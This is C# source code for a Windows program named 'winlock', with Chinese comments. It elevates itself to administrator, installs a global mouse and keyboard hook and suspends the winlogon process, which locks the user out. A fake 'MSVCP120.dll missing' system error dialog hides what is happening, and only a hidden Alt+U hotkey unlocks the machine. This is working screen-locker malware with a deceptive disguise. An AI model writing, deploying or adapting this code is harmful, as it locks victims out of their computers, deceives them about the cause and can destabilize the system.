using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winlock
{
    internal class Program
    {
        static void Main(string[] args)
        {

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
            /**
             * 当前用户是管理员的时候，直接启动应用程序
             * 如果不是管理员，则使用启动对象启动程序，以确保使用管理员身份运行
             */
            //获得当前登录的Windows用户标示
            System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
            //判断当前登录用户是否为管理员
            if (principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator))
            {
                //如果是管理员，则直接运行
                //Application.Run(new Form1());
                Run();
            }
            else
            {
                //创建启动对象
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.UseShellExecute = true;
                startInfo.WorkingDirectory = Environment.CurrentDirectory;
                startInfo.FileName = Application.ExecutablePath;
                //设置启动动作,确保以管理员身份运行
                startInfo.Verb = "runas";
                try
                {
                    System.Diagnostics.Process.Start(startInfo);
                }
                catch
                {
                    return;
                }
                //退出
                Application.Exit();
            }
        }
        static void Run()
        {
            Process[] pc = Process.GetProcessesByName("winlogon");
            if (pc.Length > 0 && ProcessMgr.SetPrivilege())
            {
                //ProcessMgr.SuspendProcess(pc[0].Id);
                //HotKeyMgr.RegisterHotKey(Keys.L, KeyModifiers.Alt);
                //HotKeyMgr.RegisterHotKey(Keys.U, KeyModifiers.Alt);
                //HotKeyMgr.HotKeyPressed += new EventHandler<HotKeyEventArgs>(HotKeyMgr_HotKeyPressed);
                MouseKeyBoardHook.Create();
                MouseKeyBoardHook.HotKeyPressed += new EventHandler<HotKeyEventArgs>(HotKeyMgr_HotKeyPressed);

                MouseKeyBoardHook.Instance.Hook_Start();
                Lock();
                Application.Run();
                MouseKeyBoardHook.Instance.Hook_Clear();
                Console.WriteLine("正在退出");
            }
        }
        static void HotKeyMgr_HotKeyPressed(object sender, HotKeyEventArgs e)
        {
            if (e.Key == Keys.L && e.Modifiers == KeyModifiers.Alt)
            {
                Lock();
            }
            else if (e.Key == Keys.U && e.Modifiers == KeyModifiers.Alt)
            {
                UnLock();
            }
            else
            {
                Console.WriteLine("HotKeyMgr_HotKeyPressed");
            }
        }
        /// <summary>
        /// 锁屏
        /// </summary>
        static void Lock()
        {
            Console.WriteLine("开始锁屏");
            MouseKeyBoardHook.Instance.LockStatus = true;
            Task.Run(() =>
            {
                MessageBox.Show("无法启动此程序，因为计算机中丢失 MSVCP120.dll，请尝试重新安装该程序以解决此问题。", "系统错误", MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
            });
            var pc = Process.GetProcessesByName("winlogon");
            if (pc.Length > 0)
            {
                ProcessMgr.SuspendProcess(pc[0].Id);
            }
        }
        /// <summary>
        /// 解锁
        /// </summary>
        static void UnLock()
        {
            Console.WriteLine("结束锁屏");
            var pc = Process.GetProcessesByName("winlogon");
            if (pc.Length > 0)
            {
                ProcessMgr.ResumeProcess(pc[0].Id);
            }
            MouseKeyBoardHook.Instance.LockStatus = false;
        }
    }
}
